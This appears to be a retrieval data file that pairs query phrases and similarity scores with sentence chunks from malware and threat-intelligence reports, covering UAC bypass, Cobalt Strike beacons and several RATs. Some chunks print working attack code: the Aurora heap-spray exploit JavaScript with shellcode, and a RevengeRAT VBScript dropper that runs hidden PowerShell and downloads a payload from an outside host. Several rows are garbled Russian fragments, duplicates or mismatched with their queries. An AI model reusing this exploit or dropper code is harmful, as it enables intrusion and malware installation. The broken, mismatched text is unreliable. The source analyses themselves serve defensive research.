Bypass UAC|0.8881387222170556|"['Decoded shellcode in mpsvc.dll In the end, the shellcode in mpsvc.mui has another different piece of hard-coded bytes, which will decompress by RtlDecompressBuffer to the final malicious executable (Figure 4).', 'www.talent-jump.com/article/2020/02/17/CLAMBLING-A-New-Backdoor-Base-On-Dropbox-en/ 4/232/18/2020 CLAMBLING - A New Backdoor Base On Dropbox (EN) | Figure 4.', 'The final malicious executable in buffer.', 'Sample Analysis The final malicious executable sample we extracted has numerous features.', 'Here is the analysis of some major functions.', 'Bypass UAC This sample can bypass UAC via .NET.', 'It is not a new technique which was disclosed in 2017 , the threat actor only changes the GUID to 9BA94120-7E02-46ee- [1] ADC6-10640B04F93B (Figure 5) and specify the location of DLL file which will load by the .NET application in the elevated process.', 'www.talent-jump.com/article/2020/02/17/CLAMBLING-A-New-Backdoor-Base-On-Dropbox-en/ 5/232/18/2020 CLAMBLING - A New Backdoor Base On Dropbox (EN) | Figure 5.', 'Code snippet of bypass UAC.', 'Persistence There are two ways to persist.', 'Register as a startup program in HKEY_CURRENT_USER\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersio n\\\\\\\\Run if it has no privileged (Figure 6).']"
Bypass UAC|0.7715387642790528|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
process injection|0.8339384015765754|"['Threat actors can add or remove features according to their malicious intentions.', ""Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections."", 'Also, with its capabilities to configure commands in the beacon configuration, the attacker can perform various malicious operations such as injecting other malicious binary into the running processes of the infected machines and can avoid having a separate injection module implants in their infection chain.', 'The Cobalt Strike beacon configurations of this campaign showed us various characteristics of the beacon binary: C2 server.', 'Communication protocols.', 'Process injection techniques.', 'Malleable C2 Instructions.', 'Target process to spawn for x86 and x64 processes.', 'Watermark : ""Xi54kA=="".', '7/10Cobalt Strike beacon configuration sample.', 'The Cobalt Strike beacon used in this campaign has the following capabilities: Executes arbitrary codes in the target processes through process injection.']"
process injection|0.7519813157576966|['l 25 T1218.001: Rundll322021 Threat Detection Report TECHNIQUE T1218.005 Mshta #2 Mshta is attractive to adversaries both in the early and latter stages of an PARENT TECHNIQUE RANK infection because it enables them to proxy the execution of arbitrary code through a trusted utility.', '18.8% Analysis ORGANIZATIONS AFFECTED Why do adversaries use Mshta?', 'Mshta.exe is a Windows-native binary designed to execute Microsoft HTML 738 Application (HTA) files.', 'As its full name implies, Mshta can execute Windows Script Host code (VBScript and JScript) embedded within HTML in a network proxy-aware fashion.', 'These capabilities make Mshta an appealing vehicle for CONFIRMED THREATS adversaries to proxy execution of arbitrary script code through a trusted, signed utility, making it a reliable technique during both initial and later stages of an infection.', 'How do adversaries use Mshta?', 'There are four primary methods by which adversaries leverage Mshta to execute arbitrary VBScript and JScript: inline via an argument passed in the command line to Mshta file-based execution via an HTML Application (HTA) file and COM-based execution for lateral movement by calling the RunHTMLApplication export function of mshtml.dll with rundll32.exe as an alternative to mshta.exe The two most commonly abused Mshta technique variations we observed in 2020 were inline and file-based execution.', 'Inline execution of code doesnt require the adversary to write additional files to disk.', 'VBScript or JScript can be passed directly to Mshta via the command line for execution.', 'This behavior gained notoriety several years ago with Kovter malware, remnants of which we still observed in 2020 despite this threat vanishing from the landscape following the 2018 indictment and arrest of the operators.', 'Heres an example of Kovter persistence in action: l 26 T1218.005: Mshta2021 Threat Detection Report Ursnif has used similar inline execution combined with code stored in the registry as part of its multistage initial access.']
and process injection|0.8097069815111486|"['Threat actors can add or remove features according to their malicious intentions.', ""Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections."", 'Also, with its capabilities to configure commands in the beacon configuration, the attacker can perform various malicious operations such as injecting other malicious binary into the running processes of the infected machines and can avoid having a separate injection module implants in their infection chain.', 'The Cobalt Strike beacon configurations of this campaign showed us various characteristics of the beacon binary: C2 server.', 'Communication protocols.', 'Process injection techniques.', 'Malleable C2 Instructions.', 'Target process to spawn for x86 and x64 processes.', 'Watermark : ""Xi54kA=="".', '7/10Cobalt Strike beacon configuration sample.', 'The Cobalt Strike beacon used in this campaign has the following capabilities: Executes arbitrary codes in the target processes through process injection.']"
the file to be downloaded.|0.8562173455574666|['Supported commands are: Execute an arbitrary command on the victims machine.', 'Its worth /run noting that command results are expected to be encoded in Cyrillic codepage.', 'Sends the contents of the file stored on the victims machine at the /download <path> given path.', 'Writes the received file on the victims machine at the path specified [file attachment] in the attachments caption, or in the current directory by default.', 'Telemiris replies with !', '(File downloaded!).', 'From what we observed, Telemiris is used as a first-stage implant that operators use to deploy other tools such as Roopy, JLORAT, or even the legitimate WinSCP binary, to further exfiltrate files.', 'Roopy Written in Pascal, this file stealer crawls the victims filesystem at regular intervals and uploads all files of interest to its C2 server.', 'At startup, it wastes CPU cycles on dead code and useless loops, which we assume are for evasion purposes.', 'Roopy then creates its working directory (%AppData%/Microsoft/OneDrive) where it stores the list of already uploaded files (as upload.dat) and a copy of documents waiting to be uploaded (in the backup subfolder).', 'Then, every 40-80 minutes, Roopy crawls C:\\\\Users and all other drives (D:, E:, ), looks for all documents (.doc, .docx, .xls, .xlsx, .txt, .pdf) modified in the last month, and stages them for upload.']
the file to be downloaded.|0.8562173455574666|"['After setting up persistence (copying itself under %AppData%/service/ and creating a RUN key entry), the malware enters its main loop where it waits for Telegram messages and replies to them.', 'Supported commands are:/runExecute an arbitrary command on the victims machine.', 'Its worth noting that command results are expected to be encoded in Cyrillic codepage./download <path>Sends the contents of the file stored on the victims machine at the given path.', '[file attachment]Writes the received file on the victims machine at the path specified in the attachments caption, or in the current directory by default.', 'Telemiris replies with !', '(File downloaded!', ').From what we observed, Telemiris is used as a first-stage implant that operators use to deploy other tools such as Roopy, JLORAT, or even the legitimate WinSCP binary, to further exfiltrate files.RoopyWritten inPascal, this file stealer crawls the victims filesystem at regular intervals and uploads all files of interest to its C2 server.', 'At startup, it wastes CPU cycles on dead code and useless loops, which we assume are for evasion purposes.', 'Roopy then creates its working directory (%AppData%/Microsoft/OneDrive) where it stores the list of already uploaded files (as upload.dat) and a copy of documents waiting to be uploaded (in the backup subfolder).Then, every 40-80 minutes, Roopy crawls C:\\\\Users and all other drives (D:, E:, ), looks for all documents (.doc, .docx, .xls, .xlsx, .txt, .pdf) modified in the last month, and stages them for upload.', 'Discovered files are collected in ZIP archives up to 5MB in size and sent to the C2 server over plain HTTP using POST requests containing such data as:{""n"":""[timestamp]_[part].zip"",""t"":""[computer name]"",""s"":""[timestamp]"",""b64"":""[base64-encoded zip file]""}This data format, naming convention as well as the URL scheme used by the C2 server (i.e., /h/pa) are very similar to SBZ filestealer.', 'We identified a number of variants of Roopy where logging can be either enabled or disabled by default, or where the base64 encoding scheme was replaced by a simple subtraction from the bytes of the obfuscated data.JLORATOur first sightings of this Rust malware date back to August 2022.']"
the file will be deleted|0.8136952637773806|"['This vulnerability can be leveraged by attackers of varying skill levels due to the public availability of the Metasploit module ie_aurora.rb .', 'The exploit code used by the original attackers was quickly improved and added to Metasploit thus greatly expanding the potential number of attackers and reliability of code.', 'The JavaScript performs a heap spray attack and injects the embedded shellcode described below.', 'The JavaScript exploits the vulnerability in Internet Explorer by copying, releasing, and then referencing a Document Object Model (DOM) element.', 'Javascript Exploit Code <html> <head> <script> var sc = unescape(""%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8db%u87 d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8caa%u9e53 %u30d4%uda37%ud8d8%u3053%ud9b2%u308 SECTION REMOVED FOR SPACE... 8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342% ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8""); var sss = Array (826, 679, 798, 224, 770, 427, 819, 770, 707, 805, 693, 679, 784, 707, 280, 238, 259, 819, 336, 693, 336, 700, 259, 819, 336, 693, 336, 700, 238, 287, 413, 224, 833, SECTION REMOVED FOR SPACE... 735, 427, 336, 413, 735, 420, 350, 336, 336, 413, 735, 301, 301, 287, 224, 861, 840, 637, 735, 651, 427, 770, 301, 805, 693, 413, 875); var arr = new Array; for (var i = 0; i < sss.length; i ++) { arr[i] = String.fromCharCode (sss [i] / 7); } var cc = arr.toString (); cc = cc.replace (/,/g, """"); cc = cc.replace (/@/g, "",""); eval (cc); var x1 = new Array (); for (i = 0; i < 200; i ++) { x1 [i] = document.createElement (""COMMENT""); x1 [i].data = ""abc""; }; var e1 = null; function ev1 (evt) { e1 = document.createEventObject (evt); document.getElementById (""sp1"").innerHTML = """"; window.setInterval (ev2, 50); } function ev2 () { p = ""\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u 0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d""; for (i = 0; i < x1.length; i ++) { x1 [i].data = p; }; var t = e1.srcElement; } </script> </head> <body> <span id=""sp1""><IMG SRC=""aaa.gif"" onload=""ev1(event)"" width=""16"" height=""16""></span> </body> </html> JavaScript Artifacts Pattern Initial encrypted dropper download.', 'Deleted file.', 'C:\\\\%appdata%\\\\a.exe Decrypted dropper.', 'Deleted file.', 'C:\\\\%appdata\\\\b.exe JavaScript present in Internet Explorer memory space.', '<code listed above> Download URL present in internet history during memory http://demo1.ftpaccess.cc/demo/ad.jpg analysis.', 'Other domains associated with Aurora.']"
deleting files|0.8083826855261883|['Capability #10: Delete file Both implants can delete a file specified by the control server if it is not a directory.', 'Figure 23.', 'Similarities in Duuzers (at left) and Rising Suns code for gathering file times.', 'Capability #7: Read a file Both implants can read the contents of a file specified by Figure 24.', 'Similarities in Duuzers (at left) and Rising Suns code for the control server and exfiltrate the contents of the file.', 'deleting a file.', 'Capability #8: Clear process memory There are no significant similarities between the two implants.', '22 Operation SharpshooterREPORT Capability #11: Get additional file information for files Capability #12: Connect to an IP address in a directory Both implants test connections to a specified IP address Both implants have the same capability to get file using the same actions, APIs, and code signatures: information for files in a specified directory, including the Test a connection to a specified network IP address following data: over a specified port number.', 'File attributes Only attempt to connect to the network address.', 'File size Based on the connection attempt, send either a File creation time success or a failure response to the control server.', 'Last access time Capability #13: Change file attributes File write time Both implants can modify the same file attributes: MZ compile time File attributes (hidden, system, etc.)']
enumerate files and registry keys|0.9273737711866186|['PLATINUM uses at least three distinct JPIN variants.', 'One variant typically runs with a mutex named hMSVmm and installs itself in the folders %appdata%\\\\Comm\\\\Jpin and %userprofile%\\\\AppData\\\\Resource\\\\Jpin.', 'After it is installed and started, the JPIN service can perform the following tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List running services, processes, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keylogger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters.']
OS Version|0.7605058164028868|['before it actually handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself.', 'The code is wrapped in 2 layers using simple crypters, so the first crypter decodes the second, and the latter decodes the actual loader code.', 'https://research.checkpoint.com/upsynergy/ 10/249/6/2019 UPSynergy: Chinese-American Spy vs. Spy Story - Check Point Research Figure 14: First and second phase of decoding the loaders payload.', 'After these phases are completed, the loader starts its operation which is broken down into the following steps: 1.', 'Dynamic function resolution.', '2.', 'Determine the OS version.', '3.', 'Locate the SrvTreeConnectList in sys.', '4.', 'Extract the encoded shellcode from a Transaction object list.']
OS Version|0.79258930413642|['2 0 1 9.', '- 2 0 1 9.', '-18 2 0 1 9.  ,  2   ,        -,      .', '1    ,     -.', 'enti- tyTypeId   .', '.', '-     -,    .', 'JSON- -,    JSON.', '2 ,           ,    .', ',   .', 'JSON-  data   GetResult.']
OS Version|0.79258930413642|"['When a victim clicks the link, it results in the download of either a ZIP archive or an ISO image, depending on the victims operating system.Although the process is seamless for the victim, the server generates a unique payload based on parameters found within the request.Figure 2 Server-side components used in BBTok infections.This process is carried out on a XAMPP-based server, and contains three essential components:A PowerShell script that handles payload preparation and contains the main bulk of the logic for creating lure archives.A PHP codebase and database designed to document and manage infections.Auxiliary utilities that enhance the functionality of these components.This is the chain of events:A victim performs an HTTP request to either/baixar,/descargaror/descarga(these paths suggest that the lures are in either Spanish or Portuguese).Based on the.htaccessfile, the server handles the request usingdescarga.php.The scripts utilize the filedb.phpto store information via an SQLite database about the request, including the victims fingerprint.Descarga.phpcallsps_gen.ps1to generate a custom archive, which is eventually delivered to the victim.Incoming Requests HandlingThe PHP codebase is composed of the following files:descarga/descargar.php Manages new connections and serves lure documents to the victims PC.db.php Generates and manages the SQLite database that includes the victims details.generator.php Utility class used to generate random links, strings, and other functionalities.Descarga and descargar translate to download in Spanish.', 'This file contains the main logic of the infection process.', 'The script itself contains many comments, some of them in plain Spanish and Portuguese, which provide hints as to the attackers origin.The script logic:It checks the geolocation of the link-referred victim against ip-api.com and stores it in a file.', 'If the victim isnt from a targeted country (i.e., Mexico or Brazil) the HTTP connection ends immediately with a 404 message.$api = new IpApi(); $whoAmI = $api->GetInfo($ip); $allowed = array(""MX"", ""BR""); file_put_contents(""ips/"".$ip.$whoAmI->countryCode, """"); if(!in_array($whoAmI->countryCode, $allowed)) {   http_response_code(404);   die(); }2.', 'If the victim passes the check, the script then parses the user agent to get the victims Windows OS version.$useragent = strtolower(htmlspecialchars($_SERVER[\'HTTP_USER_AGENT\'])); $match = false; $dfile = ""10""; $dfiles = array (   \'windows nt 10.0\' => \'10\',   \'windows nt 6.3\' => \'10\',   \'windows nt 6.2\' => \'10\',   \'windows nt 6.1\' => \'7\',   \'windows nt 6.0\' => \'7\',   \'windows nt 5.2\' => \'7\' ); foreach($dfiles as $os=>$file) {   if (preg_match(\'/\' .', '$os .', ""'/i', $useragent)) {     $match = true;     $dfile = $file;     break;    } }3."", 'It then passes the user agent with the victims country code and lure filename to the PowerShell payload generator script.PowerShell Payload GeneratorThe scriptps_gen.ps1contains the main logic for generating archive payloads, either as ZIP or ISO files.', 'The latest version of the code has a lot of commented-out sections that were likely functional in the past, which suggests they contain additional infection chains and lures.', 'We found multiple versions of the file, some dating back to July 2022, demonstrating that this operation has been ongoing for quite a while.Our analysis of the latest version is below.', 'For more details on earlier variations and changes to the script over time, see the section Earlier Versions.The generator script is called bydescarga.php, using the functionDownloadFilewith the argumentsfile_name,verandcc.These correspond to the generated archive name, the victims OS version and the victims country code.function DownloadFile($file_name, $ver, $cc) {   if($ver == ""10"" )   {     $ext = ""iso"";   } else {     $ext = ""zip"";   }   exec(\'powershell -ex Bypass -File ./ps_gen.ps1 \'.$file_name.\'']"
OS Version|1.0|[')Preferred elevation technique (How is the token replacement performed?', ')Heap spraying technique (Using AcceleratorTables?', 'Windows?', 'Bitmaps?', ')FrameworkThe flow of the exploitsOption #1:Main exploit flow with almost no side-branchesOption #2:Multiple twists and knobs for different versions of the OSThe structure of the code and functions in itModularity:Separation to functionsStructure:Separation to clear phases (Init, config, spray, token swap, )Global Variables:What information is stored in global variables?', '(OS version?', 'OS version enum?', 'Just a specific field offset?', ')Version-specific configurations:Field offsets:What fields are of special interest?Preferred system calls:Preferred set of syscallsAPI provided to the customerFigure 2:The set of exploit-related artifacts that we will be looking for.With these properties in mind, we looked back at the two samples we had and marked some artifacts we thought were unique.', 'Even though we had only two small binaries (which were essentially the same) we were able to create hunting rules to find more samples written by this developer.', 'To our surprise, we were able to find more of them than we could have imagined.One after the other, dozens of samples started to appear, and with each one, we improved our hunting rules and methodologies.']
With Rundll32,|0.7865576672492193|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
With Rundll32,|0.7865576672492193|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
With Rundll32,|0.7865576672492193|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
With Rundll32,|0.7865576672492193|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
the ability to log keystrokes|0.7702132055713171|['properly restricted and assigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconnaissance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand access.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/application: Windows OS workstations, execution Windows domain controllers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/application: Discovered systems, including networked uninterruptable power Role in infrastructure: These systems support supply (UPS) devices, data center servers, business operations, manage permissions and a telephone communications server, and domain access, and provide remote network employee workstations access respectively.', 'Role in infrastructure: Internal reconnaissance Exploitation method: Threat actors use delivered efforts could potentially include all deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to access combination of valid user credentials and the domain controller, recover additional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged accounts.', 'network discovery.', 'VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote connections to workstations and servers.', 'enabling them to expand access across the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent access, and blend into regular systems deployed across the network, identify network traffic.', 'targets, and begin preparations for final attack.']
capture screenshots,|1.0000000000000002|['Stop communications: Terminate communication session with the C2 until the next run.', 'Weve observed unimplemented Figure 14: Malicious VBScript used to persist MargulasRAT across reboots.', 'command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).']
OS version information|0.8982520017343426|[')Preferred elevation technique (How is the token replacement performed?', ')Heap spraying technique (Using AcceleratorTables?', 'Windows?', 'Bitmaps?', ')FrameworkThe flow of the exploitsOption #1:Main exploit flow with almost no side-branchesOption #2:Multiple twists and knobs for different versions of the OSThe structure of the code and functions in itModularity:Separation to functionsStructure:Separation to clear phases (Init, config, spray, token swap, )Global Variables:What information is stored in global variables?', '(OS version?', 'OS version enum?', 'Just a specific field offset?', ')Version-specific configurations:Field offsets:What fields are of special interest?Preferred system calls:Preferred set of syscallsAPI provided to the customerFigure 2:The set of exploit-related artifacts that we will be looking for.With these properties in mind, we looked back at the two samples we had and marked some artifacts we thought were unique.', 'Even though we had only two small binaries (which were essentially the same) we were able to create hunting rules to find more samples written by this developer.', 'To our surprise, we were able to find more of them than we could have imagined.One after the other, dozens of samples started to appear, and with each one, we improved our hunting rules and methodologies.']
IPv4 addresses|0.8041793298355205|['1.3.4      ,  474  .', '1.3.5        .', '1.3.6   ,    ,  474  ( ).', '1.3.7     15.210-2001 (   ) - ,  .', '1.3.8   .', '.', ',      , .', '1.3.9     .', ':   -   -  ;    ,  .', '1.3.10  ()  , .', '.']
Microsoft Exchange Server Privilege Escalation Vulnerability|0.7862425878790001|['GitHub, Inc. Windows IKEEXT DLL Hijacking Exploit Tool.', 'Last accessed on 22 January 2020 at https://github.com/itm4n/Ikeext-Privesc.', '6 ImmuniWeb.', '(8 October 2012).', 'ImmuniWeb.', 'Privilege Escalation Vulnerability in Microsoft Windows.', 'Last accessed on 23 January 2020 at https://www.immuniweb.com/advisory/HTB23108.', '7 Lawrence Abrams.', '(15 November 2016).', 'Bleeping Computer.', 'CryptoLuck Ransomware being Malvertised via RIG-E Exploit Kits.']
This could cause the file to run when double-clicked instead of opening it with a PDF viewer.|1.0|['Given other DreamJob campaigns by Lazarus, this payload was probably distributed through spearphishing or direct messages on LinkedIn.', 'The archive contains a single file: a native 64-bit Intel Linux binary written in Go and named HSBC job offerpdf.', 'Interestingly, the file extension is not .pdf.', 'This is because the apparent dot character in the filename is a leader dot represented by the U+2024 Unicode character.', 'The use of the leader dot in the filename was probably an attempt to trick the file manager into treating the file as an executable instead of a PDF.', 'This could cause the file to run when double-clicked instead of opening it with a PDF viewer.', 'On execution, a decoy PDF is displayed to the user using xdg-open, which will open the document using the users preferred PDF viewer (see Figure 3).', 'We decided to call this ELF downloader OdicLoader, as it has a similar role as the IconicLoaders on other platforms and the payload is fetched from OpenDrive.', 'OdicLoader drops a decoy PDF document, displays it using the systems default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from the OpenDrive cloud service.', 'The downloaded file is stored in ~/.config/guiconfigd (SHA-1: 0CA1723AFE261CD85B05C9EF424FC50290DCE7DF).', 'We call this second-stage backdoor SimplexTea.']
